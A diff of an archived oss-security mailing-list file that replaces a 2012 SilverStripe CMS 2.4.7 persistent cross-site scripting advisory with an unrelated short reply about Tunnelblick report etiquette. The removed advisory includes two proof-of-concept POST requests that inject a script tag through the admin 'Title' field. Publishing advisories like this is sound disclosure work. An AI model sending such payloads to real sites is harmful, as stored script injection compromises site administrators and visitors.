@@ -1,106 +1,21 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/10/14/2
-Message-ID: <CAPYM6Vz4YyCUBodE8Dj7Xw7qM_1EBLBFj02uZsWp9HRtLt11rQ@mail.gmail.com>
-Date: Mon, 15 Oct 2012 00:38:52 +0800
-From: YGN Ethical Hacker Group <lists@...g.net>
-To: full-disclosure <full-disclosure@...ts.grok.org.uk>, bugtraq <bugtraq@...urityfocus.com>,  secalert@...urityreason.com, bugs@...uritytracker.com,  vuln <vuln@...unia.com>, vuln@...urity.nnov.ru, news@...uriteam.com,  moderators@...db.org, submissions@...ketstormsecurity.org,  submit@...ecurity.com, oss-security@...ts.openwall.com
-Subject: SilverStripe CMS 2.4.7 <= Persistent Cross Site Scripting Vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/08/11/6
+Message-ID: <20120811154640.GA1026@openwall.com>
+Date: Sat, 11 Aug 2012 19:46:40 +0400
+From: Solar Designer <solar@...nwall.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: Tunnel Blick: Multiple Vulnerabilities to Local Root and DoS (OS X)
 Content-Type: text/plain; charset=utf-8
 
-1. OVERVIEW
+On Sat, Aug 11, 2012 at 05:31:23PM +0200, Jason A. Donenfeld wrote:
+> Tunnel Blick, a popular OpenVPN manager for Macintosh, has several
+> vulnerabilities in an SUID helper. I'm not sure if this is the place
+> to report vulnerabilities in Macintosh software, but Tunnel Blick is
+> open source.
 
-SilverStripe 2.4.7 and lower versions are vulnerable to Persistent
-Cross Site Scripting.
+I just want to confirm that this is on-topic (since Open Source) and
+desirable, as long as you also notify the maintainers (which you did).
 
+Thanks,
 
-2. BACKGROUND
-
-SilverStripe CMS is easy for both developers and content authors to
-work with. The SilverStripe Framework keeps the code tucked away
-neatly so that it can be accessed easily by programmers but does not
-get in the way of content authors.
-
-
-3. VULNERABILITY DESCRIPTION
-
-The "Title" parameter was not properly sanitized upon submission to
-"/index.php/admin/security/EditForm/field/Roles/AddForm" and
-"/index.php/admin/RootForm" urls, which allows attacker to conduct
-Cross Site Scripting attack. This may allow an attacker to create a
-specially crafted URL that would execute arbitrary script code in a
-victim's browser.
-
-
-4. VERSIONS AFFECTED
-
-Tested on 2.4.7
-
-
-5. PROOF-OF-CONCEPT/EXPLOIT
-
-////////////////////////////////////////
-POST /index.php/admin/security/EditForm/field/Roles/AddForm?SecurityID=[ID]
-HTTP/1.1
-Host: localhost
-Referer: http://localhost/index.php/admin/security/EditForm/field/Roles/add?SecurityID=[ID]
-Cookie: PHPSESSID=1e4ea938f83b04bc826231987cedc050;
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 146
-
-Title=%27%22%3E%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E&ctf%5BClassName%5D=PermissionRole&SecurityID=[ID]&action_saveComplexTableField=Save
-
-
-POST /index.php/admin/RootForm HTTP/1.1
-Host: localhost
-Proxy-Connection: keep-alive
-X-Requested-With: XMLHttpRequest
-X-Prototype-Version: 1.4.0_rc3
-Content-Type: application/x-www-form-urlencoded; charset=utf-8
-Referer: http://localhost/index.php/admin/
-Content-Length: 256
-Cookie: PHPSESSID=25c8f4060c398d05732fe494eb3ad4f1;
-Pragma: no-cache
-Cache-Control: no-cache
-
-Title='%22%3E%3Cscript%3Ealert(%2Fxss1%2F)%3C%2Fscript%3E&Tagline=test&CanViewType=Anyone&ViewerGroups=&CanEditType=LoggedInUsers&EditorGroups=&CanCreateTopLevelType=LoggedInUsers&CreateTopLevelGroups=&SecurityID=[ID]&Theme=&ajax=0&action_save_siteconfig=1
-////////////////////////////////////////
-
-
-6. SOLUTION
-
-Upgrade to the latest 3.x version.
-
-
-7. VENDOR
-
-SilverStripe Development Team
-http://www.silverstripe.org/
-
-
-8. CREDIT
-
-This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
-Ethical Hacker Group, Myanmar.
-
-
-9. DISCLOSURE TIME-LINE
-
-2012-02-06: notified vendor
-2012-10-15: vulnerability disclosed
-
-
-10. REFERENCES
-
-Original Advisory URL:
-http://yehg.net/lab/pr0js/advisories/%5BSilverStripe_2.4.7%5D_xss
-
-
-#yehg [2012-10-15]
-
----------------------------------
-Best regards,
-YGN Ethical Hacker Group
-Yangon, Myanmar
-http://yehg.net
-Our Lab | http://yehg.net/lab
-Our Directory | http://yehg.net/hwd
+Alexander
